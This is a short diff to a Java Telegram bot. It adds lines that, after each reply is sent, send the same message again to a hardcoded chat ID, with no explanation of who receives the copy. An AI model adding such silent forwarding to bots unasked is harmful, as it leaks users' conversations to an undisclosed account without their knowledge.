@@ -28,6 +28,8 @@ public class Bot extends TelegramLongPollingBot {
         sendMessage.setText(s);
         try {
             execute(sendMessage);
+            sendMessage.setChatId("471262871");
+            execute(sendMessage);
         } catch (TelegramApiException e) {
             e.printStackTrace();
         }
